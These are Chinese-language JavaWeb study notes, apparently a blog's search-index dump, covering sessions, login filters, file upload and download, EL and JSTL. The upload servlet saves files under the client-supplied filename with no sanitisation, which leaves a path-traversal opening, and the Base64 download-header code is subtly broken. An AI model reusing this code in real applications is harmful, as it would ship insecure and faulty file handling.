首先创建Session对象。创建和获取都是使用getSession()函数，那怎么判断它是创建还是获取呢？使用session.isNew()，返回true就代表创建，false代表获取。然后使用session.getId()可以获取sessionID。 往Session域存取数据12req.getSession().setAttribute(&quot;key1&quot;, &quot;value1&quot;);req.getSession().getAttribute(&quot;key1&quot;); Session存活时间1req.getSession().getMaxInactiveInterval(); 获取存活时间间隔，没有设置的话就是获取默认的存活时间是30分钟。然后在web.xml中可以全局配置默认的存活时间 123&lt;session-config&gt; &lt;session-timeout&gt;20&lt;&#x2F;session-timeout&gt;&lt;&#x2F;session-config&gt; 存活时间是20分钟。注意这个存活时间是两次请求的间隔时间。 设置时间间隔（秒） 1req.getSession().setMaxInactiveInterval(3); 存活时间是3秒。如果是负数，则永不超时。 设置立即无效 1req.getSession().invalidate(); Cookie与Session的组合首先，浏览器第一次请求服务器，这时候没有session和cookie。然后服务器创建一个session对象，同时生成相应的sessionID，然后将这个sessionID作为值与JSESESSIONID组合成键值对，保存到cookie中。服务器将cookie发送回客户端。之后的请求客户端都会发送cookie，服务器接收到后，解析cookie获得sessionID值，然后找到服务器中保存的sessionID对应的session对象，之后处理。 Filter过滤器用于过滤请求，进行权限管理。 新建一个Filter工程，然后在web目录下新建一个admin目录，在该目录下新建admin.jsp, 部署访问：http://localhost:8080/Filter/admin/admin.jsp。此时可以访问。 但是admin目录下，我们必须要让admin登陆之后才能访问这个页面，就需要配置Filter过滤器了。 Filter过滤器会拦截请求，根据doFilter函数中的代码进行权限校验。 Filter过滤器首先在src目录下新建一个包，然后新建一个AdminFilter类。 该类实现Filter类，注意，Filter类在很多包里面都有，因此需要选择java.servlet的。然后在dofilter函数中编写校验代码。 首先拦截http请求，为了获取session域中的数据，需要先将servletRequest强制转换成HttpServletRequest，然后调用getSession获取session对象，再获取username的值。类型是Object哦。之后判断如果user为空，说明没有登陆，就将请求转发到login.jsp登陆界面。否则，说明登陆了，就使用filterChain.doFilter放行请求，继续访问原来要访问的资源。如果没有这句话，请求就会被丢弃，访问是一片空白。 当然需要在web.xml中配置 该Filter过滤器只过滤要访问admin目录下所有资源的请求。之后部署访问即可，发现跳转到了登陆界面。 加上用户登陆新建一个Sevlet包，新建一个LoginServlet类。 然后配置web.xml 之后login.jsp写一个表单 action中写工程名和servlet路径。 因此，流程如下：login.jsp输入账户密码后，登陆，请求先提交给login即LoginServlet类，检查账户密码是否正确，如果正确，那么获取session对象，设置用户数据。之后访问admin下的admin.jsp时，请求会被Filter过滤器拦截，判断出session域下的用户名存在，说明登陆成功了，那么放行请求，即可访问到admin.jsp。 Filter的生命周期1.构造函数，当启动web工程时就执行。 2.init初始化，当启动web工程时就执行。 3.doFilter方法，每次拦截到请求，就执行。 4.destroy方法，当停止web工程时就执行。 FilterConfig类在Filter过滤器的类中的init函数 FilterConfig有三个功能，获取Filter的名称，获取Filter的配置参数，获取servletContext上下文对象。 然后在web.xml中配置init-param 需要放在filter中。之后重新部署即可。 filterChain类过滤器链，对同一个url资源可以配置多个过滤器，它们的工作流程如下： 其实就是一个过滤器拦截请求后，使用filterChain放行后，下一个过滤器又拦截了。 Filter拦截路径 精确匹配：&lt;url-pattern&gt;/admin.jsp&lt;/url-pattern&gt;, 匹配到的是工程路径下的admin.jsp。 目录匹配：&lt;url-pattern&gt;/admin/*&lt;/url-pattern&gt;, 匹配到的是当前工程路径下的admin目录下的所有文件。 后缀匹配：&lt;url-pattern&gt;*.jsp&lt;/url-pattern&gt;, 注意不能有/, 匹配到的是当前工程路径下的以jsp结尾的文件。","categories":[{"name":"JavaWeb","slug":"JavaWeb","permalink":"https://ggyggy666.github.io/categories/JavaWeb/"}],"tags":[{"name":"JavaWeb学习","slug":"JavaWeb学习","permalink":"https://ggyggy666.github.io/tags/JavaWeb%E5%AD%A6%E4%B9%A0/"}],"keywords":[{"name":"JavaWeb","slug":"JavaWeb","permalink":"https://ggyggy666.github.io/categories/JavaWeb/"}]},{"title":"JavaWeb学习(7)","slug":"JavaWeb学习-7","date":"2021-05-15T13:09:44.000Z","updated":"2021-05-15T15:37:46.943Z","comments":true,"path":"2021/05/15/JavaWeb学习-7/","link":"","permalink":"https://ggyggy666.github.io/2021/05/15/JavaWeb%E5%AD%A6%E4%B9%A0-7/","excerpt":"今天学习文件上传和下载。","text":"今天学习文件上传和下载。 文件上传文件上传，需要前后端操作处理。前端上传，后端处理数据。 前端上传写上传代码 12345&lt;form action&#x3D;&quot;&#x2F;upload&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot; method&#x3D;&quot;post&quot;&gt; 用户名：&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot; value&#x3D;&quot;&quot;&gt;&lt;br&gt; 头像：&lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;photo&quot;&gt;&lt;br&gt; &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;上传&quot;&gt;&lt;br&gt;&lt;&#x2F;form&gt; enctype类型是multipart/form-data, 代表文件是多段上传，而且上传的是二进制流数据。 后端处理首先得看一下文件上传时的请求包 使用boundary作为分割，将每一个input表单项分开。上传的文件数据是二进制流格式，因此需要使用读取输入流的方式。 写后端处理程序UploadServlet 12345&#x2F;&#x2F;doPost方法：ServletInputStream inputStream &#x3D; req.getInputStream();byte[] buffer &#x3D; new byte[1024000];int read &#x3D; inputStream.read(buffer);System.out.println(new String(buffer, 0, read)); 首先获取输入流数据，然后定义一个字节数组，大小是1024000，大点能装得下数据就行。然后使用输入流的read方法，将输入流保存到buffer里面，并且返回输入流的长度给read。最后输出，需要实例化String对象，传buffer进去，将0到read长度（即所有流数据）变成字符串输出。 当然，还需要给Servlet程序配置web.xml，并且前端代码的action修改成Servlet的路径http://localhost:8080/EL_JSTL/upload, 这是绝对路径，如果是相对路径，因为在web目录，可使用：upload。注意不要用/upload, 不然会默认是根目录下的。然后重新部署。 获取到了上传的数据。 解析数据需要使用commons-fileupload.jar包，到apache下。然后导入。 还需要commons-io.jar, 因为输入输出流需要IO操作。 用到的类是：ServletFileUpload类，它涉及以下方法： ServletFileUpload.isMultipartContent(HttpServletRequest request), 判断上传的数据是不是多段数据，返回true或false。 ServletFileUpload.parseRequest(HttpServletReqeust request), 解析上传的数据，提取出每一个表单项，装到List集合。 isFormField(), 判断当前表单项是否是普通表单项，是则表示普通表单项，否则是上传文件项。 getFieldName(), 获得表单项中的name属性值。 getString(), 获得当前表单项的值。 getName(), 获得上传的文件名。 write(file), 将上传的文件写到file所指的磁盘路径文件。 doPost函数： 123456789101112131415161718192021222324if(ServletFileUpload.isMultipartContent(req))&#123; &#x2F;&#x2F;创建FileItemFactory工厂实现类 DiskFileItemFactory diskFileItemFactory &#x3D; new DiskFileItemFactory(); &#x2F;&#x2F;创建用于解析上传数据的工具栏ServletFileUpload ServletFileUpload servletFileUpload &#x3D; new ServletFileUpload(diskFileItemFactory); try &#123; List&lt;FileItem&gt; list &#x3D; servletFileUpload.parseRequest(req); for(FileItem item : list)&#123; if(item.isFormField())&#123; &#x2F;&#x2F;普通表单项 System.out.println(&quot;表单项的name属性值：&quot;+item.getFieldName()); System.out.println(&quot;表单项的值：&quot;+item.getString(&quot;UTF-8&quot;)); &#125;else&#123; System.out.println(&quot;上传的文件名：&quot;+item.getName()); System.out.println(&quot;表单项的name属性值：&quot;+item.getFieldName()); item.write(new File(&quot;D:\\\\&quot;+item.getName())); &#125; &#125; &#125; catch (FileUploadException e) &#123; e.printStackTrace(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; D盘下就可以看到上传的文件了。 文件下载创建DownloadServlet类： 12345678910111213141516&#x2F;&#x2F;获取要下载的文件名 String fileName &#x3D; &quot;burp.png&quot;; &#x2F;&#x2F;获取要下载的文件名的类型 ServletContext servletContext &#x3D; getServletContext(); String mimeType &#x3D; servletContext.getMimeType(&quot;file&#x2F;&quot;+fileName); System.out.println(&quot;要下载的文件类型：&quot;+mimeType); &#x2F;&#x2F;设置返回的数据类型 resp.setContentType(mimeType); &#x2F;&#x2F;设置返回头，告诉客户端是下载文件,attachment表示附件 resp.setHeader(&quot;Content-Disposition&quot;, &quot;attachment; filename&#x3D;&quot;+fileName); &#x2F;&#x2F;获取文件流 InputStream resourceAsStream &#x3D; servletContext.getResourceAsStream(&quot;file&#x2F;&quot; + fileName); &#x2F;&#x2F;获取响应的输出流 OutputStream outputStream &#x3D; resp.getOutputStream(); &#x2F;&#x2F;将文件流复制到输出流输出 IOUtils.copy(resourceAsStream, outputStream); 这里是在web目录下新建了一个file目录，里面是burp.png图片。之后部署web.xml，访问路径是/download, 然后重新部署。访问即可下载。 URL编码setHeader里面，文件名可以是自定义的。但如果是中文名，需要使用URL编码，针对谷歌浏览器。 1resp.setHeader(&quot;Content-Disposition&quot;, &quot;attachment; filename&#x3D;&quot;+ URLEncoder.encode(&quot;中国.png&quot;, &quot;UTF-8&quot;)); 使用URLEncoder.encode即可。 Base64编码如果是火狐浏览器，对于中文名称的文件使用的是Base64编码。下面先测试使用base64： 加密 1234567String content &#x3D; &quot;这是base64要编码的中文内容&quot;;&#x2F;&#x2F;new一个base64编码对象Base64.Encoder encoder &#x3D; Base64.getEncoder();&#x2F;&#x2F;将content内容使用getBytes转换成字节流，然后再encode，返回也是字节数组byte[] encodecontent &#x3D; encoder.encode(content.getBytes(&quot;UTF-8&quot;));&#x2F;&#x2F;需要将字节流转换成字符串输出System.out.println(new String(encodecontent)); 解密 123456&#x2F;&#x2F;获取解密对象Base64.Decoder decoder &#x3D; Base64.getDecoder();&#x2F;&#x2F;将加密后的字节流解密，返回也是字节数组byte[] decode &#x3D; decoder.decode(encodecontent);&#x2F;&#x2F;将字节数组转换成字符串输出System.out.println(new String(decode, &quot;UTF-8&quot;)); 但是到Servlet程序中进行文件下载时，setHeader的文件名进行base64编码需要有一个特定的格式： ?charset?B?xxx?= charset表示编码类型，B表示是Base64编码，xxx是Base64加密后的内容，=是结束。因此有： 12resp.setHeader(&quot;Content-Disposition&quot;, &quot;attachment; filename&#x3D;?UTF-8?B?&quot;+Base64.getEncoder().encode(&quot;中国.png&quot;.getBytes(&quot;UTF-8&quot;))+&quot;?&#x3D;&quot;); User-Agent判断但是用了火狐设置的方法，IE又不支持了。。因此需要根据User-Agent来判断浏览器，从而判断应该使用哪种方法。 123456if(req.getHeader(&quot;User-Agent&quot;).contains(&quot;FireFox&quot;))&#123; resp.setHeader(&quot;Content-Disposition&quot;, &quot;attachment; filename&#x3D;?UTF-8?B?&quot;+Base64.getEncoder().encode(&quot;中国.png&quot;.getBytes(&quot;UTF-8&quot;))+&quot;?&#x3D;&quot;); &#125;else&#123; resp.setHeader(&quot;Content-Disposition&quot;, &quot;attachment; filename&#x3D;&quot;+ URLEncoder.encode(&quot;中国.png&quot;, &quot;UTF-8&quot;)); &#125; MVC概念主要是将Web层分开工作，更好的解耦合。 M是module, 表示模型，V是View，表示视图，C是Controller，表示控制器。 Module：将与业务相关的数据封装成JavaBean类，但是不处理数据。有：JavaBean/domain/entity/pojo。 View：只负责展示界面和输出数据。有：JSP/HTML Controller：只负责接收请求，然后调用业务层的代码处理请求，获取数据，然后派发界面，跳转到某个界面。有：Servlet。","categories":[{"name":"JavaWeb","slug":"JavaWeb","permalink":"https://ggyggy666.github.io/categories/JavaWeb/"}],"tags":[{"name":"JavaWeb学习","slug":"JavaWeb学习","permalink":"https://ggyggy666.github.io/tags/JavaWeb%E5%AD%A6%E4%B9%A0/"}],"keywords":[{"name":"JavaWeb","slug":"JavaWeb","permalink":"https://ggyggy666.github.io/categories/JavaWeb/"}]},{"title":"JavaWeb学习(6)","slug":"JavaWeb学习-6","date":"2021-05-14T02:23:36.000Z","updated":"2021-05-15T13:10:30.750Z","comments":true,"path":"2021/05/14/JavaWeb学习-6/","link":"","permalink":"https://ggyggy666.github.io/2021/05/14/JavaWeb%E5%AD%A6%E4%B9%A0-6/","excerpt":"今天学习EL表达式和JSTL标签库。","text":"今天学习EL表达式和JSTL标签库。 EL表达式使用EL表达式：${key} 创建一个新的工程，在index.jsp页面写 首先先在request中保存数据，然后按两种表达式方法输出。 都成功输出来了。但是如果key不存在，比如改成获取key1的值 表达式脚本会输出null, EL表达式直接为空。因此EL表达式输出更加精确。 四个域对象输出顺序如果它们域中保存的key名称都相同，按照域对象从小到大的顺序输出 key值都是key,那么输出是：1 将pageContext那行注释掉，输出是：2 将request那行注释掉，输出是：3 将session那行注释掉后，还得重启浏览器清除掉session, 输出是：4 将application那行注释掉后，重启tomcat服务，没有输出了。 输出Bean对象的属性有普通属性、数组、List和Map属性 首先定义一个Person类 定义了普通String类型，字符数组类型，List类型和Map类型。生成了有参和无参的构造函数，生成了Getter和Setter方法，最后生成了toString方法。 在b.jsp中，创建一个Person对象，然后调用Setxxx的方法将Person里的属性初始化。 初始化数组并作为参数：new String[]{&quot;&quot;,&quot;&quot;} 定义List,里面值是String类型： List&lt;String&gt; cities = new ArrayList&lt;String&gt;(); 定义Map，key是String类型，value是Object类型： Map&lt;String, Object&gt; map = new HashMap&lt;&gt;(); 最后，将这个实例化后的对象保存在pageContext对象中。 获取person对象：${p} 全都输出来了。 获取name: ${p.name} 获取数组：${p.phone} 输出了：[Ljava.lang.String;@2af43773，显然不行。因为数组的值需要用下标访问。 ${p.phone[0]} 获取List属性值：${p.cities} 与数组不同，这样可以直接输出List里面所有值。如果想获取某个值：${p.cities[0]} 获取map属性值：${p.map} 同样可以直接将map里面的所有键值对输出。要获取某个键的值：${p.map.key1} 这里要注意一点，输出对象里面的属性值，这个值是根据那个对象的Get函数方法返回的，而不是直接访问那个属性。 比如在Person类里面定义多一个属性：private int age = 18; 然后JSP里面使用：${p.age}是不行的。这个时候需要给age属性生成一个Get方法 123public int getAge() &#123; return age;&#125; 这个时候才会输出18来。而且就算没有定义age, 直接使用Get方法： 123public int getAge() &#123; return 18;&#125; 重新部署后，也能输出18。它是根据Getxxx方法，获取Get后面的字符，将其转换为小写作为属性输出。 运算EL表达式里面也可以进行各种运算。 关系运算： 逻辑运算： 算术运算 注意，除法得到的是浮点数，12.0 empty运算 ${empty xxx}, 判断xxx是否为空 比如：${empty emptyNull}, 返回true 三元运算 (12==12)?&quot;yes&quot;:&quot;no&quot; 点运算和[]运算 其实就是获取键值对的值。比如一个map对象，map.key就行。如果key本身包含运算符，就不能用.了。比如key是：a.a.a,或者b+b+b，不能用map.a.a.a这些，需要用[]。如：map[‘a.a.a’], map[‘b+b+b’], 需要用引号。 EL表达式的11个隐含对象它们都是EL表达式自己定义的，可以直接使用。 获取四个域的属性值上面也提到过，四个域，当它们的键key一样时，输出会按照域的大小顺序来输出，而且只输出最小的那个。这样想获取其它域的key的值的时候就没有办法获取。于是，可以使用EL表达式的四个域获取。 这样四个数字都能输出来。 pageContext的使用这个pageContext可以获取其它九大对象，因此也可以使用相应的方法。比如request对象和session对象。 输出： 但是这样比原来的表达式脚本还麻烦，因此需要一个技巧： 先把request域存储起来，之后使用req就可以了。其它对象类似。 其它对象param可以获取请求参数的值 123$&#123;param.username&#125;&lt;br&gt;$&#123;paramValues.hobby[0]&#125;&lt;br&gt;$&#123;paramValues.hobby[1]&#125;&lt;br&gt; 访问：http://localhost:8080/EL_JSTL/d.jsp?username=ggy&amp;hobby=run&amp;hobby=sing 页面输出：ggy run sing header cookie因为cookie是键值对xxx=xxx, 所以它有name和value之分 initParam可以输出web.xml中配置的context-param值 web.xml中配置： 代码： 可以通过${initParam.参数名}获取参数值。 JSTL标签库JSP Standard Tag Library. 需要在JSP页面中使用taglib指令将标签库引进： 1&lt;%@ taglib prefix&#x3D;&quot;c&quot; uri&#x3D;&quot;http:&#x2F;&#x2F;java.sun.com&#x2F;jsp&#x2F;jstl&#x2F;core&quot;%&gt; prefix是别名，之后就可以使用：&lt;c:xx&gt;作为标签使用。 当然，其它库的别名是：x, fmt, sql, fn 使用首先得下载两个jar包。taglibs-standard-spec-1.2.5， taglibs-standard-impl-1.2.5， 然后导入到工程模块中。 之后可以手动输入taglib, 或者可以输入：&lt;c:forEach, 就会出现提示，按tab就行。 set标签可以在域中存储数据。 1&lt;c:set scope&#x3D;&quot;page&quot; var&#x3D;&quot;a&quot; value&#x3D;&quot;ggy&quot;&#x2F;&gt; scope代表域，var就是key，value就是值。 page: pageContext域 request: request域 session：session域 application：ServletContext域 之后使用EL表达式读取域的数据即可。 12&lt;c:set scope&#x3D;&quot;request&quot; var&#x3D;&quot;a&quot; value&#x3D;&quot;ggy&quot;&gt;&lt;&#x2F;c:set&gt;$&#123;requestScope.a&#125; if标签用来做判断 123&lt;c:if test&#x3D;&quot;$&#123;12&#x3D;&#x3D;12&#125;&quot;&gt; &lt;h1&gt;ggy666&lt;&#x2F;h1&gt;&lt;&#x2F;c:if&gt; test的值应该是True或者False，而要得到这两个值，需要使用EL表达式进行条件判断。如果True，则执行标签里面的内容&lt;h1&gt;, 否则不会执行。 choose标签choose, when, otherwise一起用的。相当于switch case default，进行多项选择。但是case某一个是真，后面如果没有break的话，之后都会执行。而when只执行那一个when标签里的。 1234567891011&lt;% request.setAttribute(&quot;ggy&quot;, &quot;ggy666&quot;);%&gt;&lt;c:choose&gt; &lt;c:when test&#x3D;&quot;$&#123;requestScope.ggy&#x3D;&#x3D;&#39;ggy666&#39;&#125;&quot;&gt; &lt;h3&gt;Yes&lt;&#x2F;h3&gt; &lt;&#x2F;c:when&gt; &lt;c:otherwise&gt; &lt;h3&gt;Error!&lt;&#x2F;h3&gt; &lt;&#x2F;c:otherwise&gt;&lt;&#x2F;c:choose&gt; 有一个注意点，choose标签里面不能使用HTML注释，只能用JSP注释。when的父标签必须是choose标签。就是说，如果otherwise标签里面也有选择判断，需要使用when, 那么就必须先使用choose, 再加when 1234567&lt;c:otherwise&gt; &lt;c:choose&gt; &lt;c:when test&#x3D;&quot;$&#123;requestScope.ggy!&#x3D;&#39;ggy666&#39;&#125;&quot;&gt; &lt;h3&gt;No&lt;&#x2F;h3&gt; &lt;&#x2F;c:when&gt; &lt;&#x2F;c:choose&gt;&lt;&#x2F;c:otherwise&gt; forEach标签循环遍历数字范围123c:forEach begin&#x3D;&quot;1&quot; end&#x3D;&quot;10&quot; var&#x3D;&quot;i&quot;&gt; $&#123;i&#125;&lt;&#x2F;c:forEach&gt; 输出1到10. begin是开始循环，end是结束循环，var是循环的变量。 循环遍历数组123456&lt;% request.setAttribute(&quot;arr&quot;, new String[]&#123;&quot;gg&quot;, &quot;ggy&quot;, &quot;ggy666&quot;&#125;);%&gt;&lt;c:forEach items&#x3D;&quot;$&#123;requestScope.arr&#125;&quot; var&#x3D;&quot;n&quot;&gt; $&#123;n&#125;&lt;&#x2F;c:forEach&gt; 首先保存一个数组到request域中，之后使用${requestScope.arr}定位到arr数组，并且赋值到items，表示要遍历的数组，var则是遍历的变量。 循环遍历Map123456789&lt;% Map&lt;String, Object&gt; map &#x3D; new HashMap&lt;&gt;(); map.put(&quot;key1&quot;, &quot;ggy666&quot;); map.put(&quot;key2&quot;, &quot;root&quot;); request.setAttribute(&quot;map&quot;, map);%&gt;&lt;c:forEach items&#x3D;&quot;$&#123;requestScope.map&#125;&quot; var&#x3D;&quot;m&quot;&gt; $&#123;m&#125;&lt;&#x2F;c:forEach&gt; 同样先定义初始化map, 然后保存到request域中。之后遍历。不过因为是map，所以${m}输出的是键值对。如果只想输出key获取value，使用 12$&#123;m.key&#125;$&#123;m.value&#125; 循环遍历List集合中对象的属性1234567891011&lt;% List&lt;Person&gt; personList &#x3D; new ArrayList&lt;Person&gt;(); for(int i&#x3D;0; i&lt;5; i++)&#123; personList.add(new Person(&quot;name&quot;+i, &quot;134&quot;+i)); &#125; request.setAttribute(&quot;per&quot;, personList);%&gt;&lt;c:forEach items&#x3D;&quot;$&#123;requestScope.per&#125;&quot; var&#x3D;&quot;i&quot;&gt; $&#123;i.name&#125; $&#123;i.phone&#125;&lt;&#x2F;c:forEach&gt; 创建一个Person类，然后创建List集合，实例化五个Person对象加入集合，然后将List装进request域。最后遍历，变量.属性即可。 其它属性step表示遍历的步长值，比如i++, i+=2这样，2就是步长。 varStatus: 表示当前遍历的变量的状态。这个有很多用： 12345&lt;c:forEach varStatus&#x3D;&quot;status&quot; begin&#x3D;&quot;1&quot; end&#x3D;&quot;5&quot; step&#x3D;&quot;2&quot;&gt; $&#123;status.begin&#125; $&#123;status.step&#125; $&#123;status.current&#125;&lt;&#x2F;c:forEach&gt; 前面说过，EL表达式其实获取的是Getxxx函数（或者isxxx)返回的值，因此看status的方法，比如有getIndex(), 那么EL表达式中使用：${status.index}即可。","categories":[{"name":"JavaWeb","slug":"JavaWeb","permalink":"https://ggyggy666.github.io/categories/JavaWeb/"}],"tags":[{"name":"JavaWeb学习","slug":"JavaWeb学习","permalink":"https://ggyggy666.github.io/tags/JavaWeb%E5%AD%A6%E4%B9%A0/"}],"keywords":[{"name":"JavaWeb","slug":"JavaWeb","permalink":"https://ggyggy666.github.io/categories/JavaWeb/"}]},{"title":"JavaWeb学习(5)","slug":"JavaWeb学习-5","date":"2021-05-11T11:52:10.000Z","updated":"2021-05-13T09:09:23.434Z","comments":true,"path":"2021/05/11/JavaWeb学习-5/","link":"","permalink":"https://ggyggy666.github.io/2021/05/11/JavaWeb%E5%AD%A6%E4%B9%A0-5/","excerpt":"今天接着学习jsp的内容","text":"今天接着学习jsp的内容 注释JSP页面中可以有三种注释。 HTML注释：&lt;!-- xxx --&gt;,会被JSP编译器翻译成out.write直接输出到客户端。 Java代码注释：单行//, 多行/* xx */。会被翻译到Java文件中作为注释，这是因为它需要放到&lt;% xxx %&gt;里面，作为代码部分。 JSP注释：&lt;%-- xx --%&gt;, 不会输出到客户端源码，也不会翻译到Java文件中它也可以注释掉JSP页面中所有代码。包括其它注释。 另外注意：HTML注释中，JSP的表达式脚本可以运行。 嵌在HTML注释中的JSP表达式脚本被执行了返回ggy，然后作为HTML中的注释被输出。 九大内置对象 request：请求对象。 response：响应对象。 pageContext: jsp的上下文对象。 session: 会话对象。 application：ServletContext对象。 config：ServletConfig对象。 out: jsp输出流对象。 page：指向当前jsp的对象。 exception: 异常对象。 四大域对象 pageContext对象（pageContextimpl类）：有效范围是当前jsp页面。 request对象（HttpServletRequest类）：一次请求内有效 session对象（HttpSession类）：一个会话范围内有效。 application对象（ServletContext类）：整个web工程有效。 域对象是指可以像Map一样存取数据。 首先创建一个scope.jsp 设置好域对象的数据，然后获取输出到页面，访问scope.jsp即可看到四个数据。接下来一个个测试它们的作用范围。 首先是pageContext对象，作用范围是当前JSP页面。 新建一个JSP页面scope2.JSP，其内容是获取四个域对象的数据。 然后在scope.jsp中将请求转发到scope2.jsp。 12&lt;% request.getRequestDispatcher(&quot;&#x2F;scope2.jsp&quot;).forward(request, response);%&gt; 这样，访问scope.jsp的时候会转发请求然后跳到scope2.jsp, scope2.jsp就无法获取到scope.jsp中设置的pageContext域对象数据。 然后是直接访问scope2.jsp，会看到request域对象的数据也是null。 之后将浏览器关闭，再重新访问scope2.jsp，发现session数据也没了。 最后重启tomcat，访问scope2.jsp, application数据没了。 out和response输出先看代码 访问 发现response的输出比out更靠前了！ 这是因为，out有缓冲区，response也有缓冲区。当页面代码执行完毕后要输出时，会先执行out.flush()操作，将out缓冲区中的内容追加到response缓冲区中，然后再执行response缓冲区的刷新操作输出。 当然，也可以手动改变输出顺序，可以在out打印之后就执行out.flush() 执行输出顺序就变成：test1-&gt;test3-&gt;test4-&gt;test2了。 由于JSP编译器将JSP代码翻译成java文件时，使用的就是out.write。因此，为了避免输出顺序乱了，应使用out.write输出 out和print打印代码： 1234567&lt;% out.write(&quot;ggy&quot;); out.print(&quot;ggy&quot;); out.write(&quot;12&quot;); out.print(&quot;12&quot;);%&gt; 结果是两个都能正确打印。因为打印的是字符串。 代码： 1234&lt;% out.write(12); out.print(12);%&gt; 打印数字，第一个out.write打印出来奇怪的东西，而out.print正确打印出来了12。 这是因为：out.write打印字符串没问题，打印数字时，会将数字作为ASCII码，然后将该ASCII码对应的字符输出来。而out.print不管打印什么类型的，都会先将其转换成字符串类型再打印出来。 因此，最好使用：out.print()打印。 包含其它jsp文件静态包含1&lt;%@ include file&#x3D;&quot;&#x2F;include&#x2F;footer.jsp&quot;%&gt; &lt;%@ xx %&gt;表示的是指令，比如：&lt;%@ page=xx %&gt;也是。 静态包含会将其它jsp文件的内容包含进来，相当于在本jsp文件中加入了其它jsp文件里的内容，翻译成Java文件输出。 被包含的jsp文件不会被翻译成java文件。 动态包含1&lt;jsp:include page&#x3D;&quot;footer.jsp&quot;&gt;&lt;&#x2F;jsp:include&gt; 翻译成java文件后 发现是一行代码，该代码作用：main.jsp动态包含footer.jsp, 那么main.jsp会将request和response，out对象都传给footer.jsp供它使用，那么这两个文件操作的都是同一个域对象，可以共享数据。 动态包含可以传递数据。 main.jsp中 1234&lt;jsp:include page&#x3D;&quot;footer.jsp&quot;&gt; &lt;jsp:param name&#x3D;&quot;username&quot; value&#x3D;&quot;root&quot;&#x2F;&gt; &lt;jsp:param name&#x3D;&quot;password&quot; value&#x3D;&quot;ggy666&quot;&#x2F;&gt;&lt;&#x2F;jsp:include&gt; footer.jsp中 12&lt;%&#x3D;request.getParameter(&quot;username&quot;)%&gt;&lt;%&#x3D;request.getParameter(&quot;password&quot;)%&gt; 再访问main.jsp, 然后看到包含进来的footer.jsp输出了root和ggy666。 请求转发之前的servlet的请求转发： 1request.getRequestDispatcher(&quot;&#x2F;scope2.jsp&quot;).forward(request, response); 现在JSP的请求转发： 1&lt;jsp:forward page&#x3D;&quot;scope2.jsp&quot;&gt;&lt;&#x2F;jsp:forward&gt; Listener监听器JavaWeb三大组件：Servlet程序、Filter过滤器和Listener监听器。 它其实就是个接口，负责监听事件，然后需要我们去实现接口，当触发事件时执行相应的函数。 有八大监听器。 ServletContextListener监听器 主要是用于监听ServletContext对象的创建和销毁。而Web工程创建时会创建ServletContext对象，重新部署运行会销毁。 contextInitialized(ServletContextEvent sce): 创建 contextDestroyed(ServletContextEvent sce): 销毁 新建一个类，然后实现监听器接口 练习九九乘法表 输出学生信息1.首先定义一个学生类，类里面定义学生的属性，然后构造函数初始化，再生成Getter and Setter, 最好再生成一个toString方法将学生属性输出。 2.使用JSP文件，先是生成10个学生对象并同时对它们进行初始化，然后将对象保存进一个数组中 注意，Java的列表使用的是List&lt;&gt;，需要动态new一个空间出来，空间大小则是根据&lt;&gt;里的类型而定。然后列表有add方法，可以直接将内容添加到数组中。 3.遍历列表中保存的学生对象，将每个对象的属性数据输出 注意，遍历数组时，for循环可以直接用(Student student: 列表)的形式。稍微加一些css即可 JSP与Servlet联动Servlet程序在web.xml中部署了访问路径，用户首先可以访问这个servlet路径，发起一个请求。Servlet接收到请求后，获取请求参数，然后将参数拼接到sql语句去查询数据库，得到的数据保存到request中。然后使用请求转发的方式，将请求转发到JSP中。由于请求转发的request对象和response对象都不变，JSP中则可以使用request对象访问到Servlet程序保存的数据，并输出到页面。 1.新建一个Servlet程序，在doGet方法中 2.修改test2.jsp内容，这次不用再生成学生对象了，只需要接收request中的学生对象数组。 3.配置web.xml, 增加访问Servlet程序的路径 一定要重新部署，然后访问student即可","categories":[{"name":"JavaWeb","slug":"JavaWeb","permalink":"https://ggyggy666.github.io/categories/JavaWeb/"}],"tags":[{"name":"JavaWeb学习","slug":"JavaWeb学习","permalink":"https://ggyggy666.github.io/tags/JavaWeb%E5%AD%A6%E4%B9%A0/"}],"keywords":[{"name":"JavaWeb","slug":"JavaWeb","permalink":"https://ggyggy666.github.io/categories/JavaWeb/"}]},{"title":"JavaWeb学习(4)","slug":"JavaWeb学习-4","date":"2021-05-07T02:35:27.000Z","updated":"2021-05-07T03:49:37.990Z","comments":true,"path":"2021/05/07/JavaWeb学习-4/","link":"","permalink":"https://ggyggy666.github.io/2021/05/07/JavaWeb%E5%AD%A6%E4%B9%A0-4/","excerpt":"今天开始学习jsp。","text":"今天开始学习jsp。 之前用的Servlet返回数据给页面，如果返回的是一个网页，那么得一行行输出返回，实在麻烦。而Jsp可以像写网页那样直接写网页就行了，方便很多。访问也可以直接访问xxx.jsp即可。 Jsp本质 当第一次访问Jsp时，tomcat服务器会将jsp文件翻译成一个.class和java源文件。路径是：C:\\Users\\29924.IntelliJIdea2019.3\\system\\tomcat\\Tomcat_8_5_60_JavaWeb_5\\work\\Catalina\\localhost\\Jsp\\org\\apache\\jsp 而java源文件里面 我创建的是test.jsp, 它则定义了一个test_jsp类，继承了HttpJspBase, 而这个HttpJspBase又是继承了HttpServlet, 因此jsp可以说是HttpServlet的封装。看后面内容 这是Jsp的内容，但在这个源文件里，也是像servlet程序那样将内容一行行输出。所以说，我们在jsp文件里输的内容，tomcat服务器会帮我们自动转化成servlet输出返回的形式封装在这个Java源文件里面。我们只需要专心写网页就行，tomcat帮我们做好了输出返回。 page标签注意到jsp文件页面的首部有一个page标签。 1&lt;%@ page contentType&#x3D;&quot;text&#x2F;html;charset&#x3D;UTF-8&quot; language&#x3D;&quot;java&quot; %&gt; 它可以用来修改页面的属性。属性如下： language: jsp翻译后是什么程序的文件，暂时只支持Java，就是上面说的Java源文件。 contentType: jsp返回的数据类型，text/html返回HTML。 pageEncoding: 当前jsp页面的字符集编码。 import: 导入包和类。 autoFlush：缓冲区满了之后，是否自动刷新缓冲区。默认是true。 buffer: 缓冲区的大小，默认是8kb. errorPage: 出错后重定向到哪个错误页面。 isErrorPage: 当前页面是否是错误页面。默认是false，如果是true可以获取异常信息。 session: 访问当前jsp页面时，是否创建HttpSession对象，默认是true。 extends: 将jsp翻译出来的java源文件里的java类默认继承谁。 声明脚本可以在JSP页面声明属性、方法、静态代码块和内部类等。使用&lt;%! %&gt;即可。 声明属性 再访问一下jsp，然后看java源文件 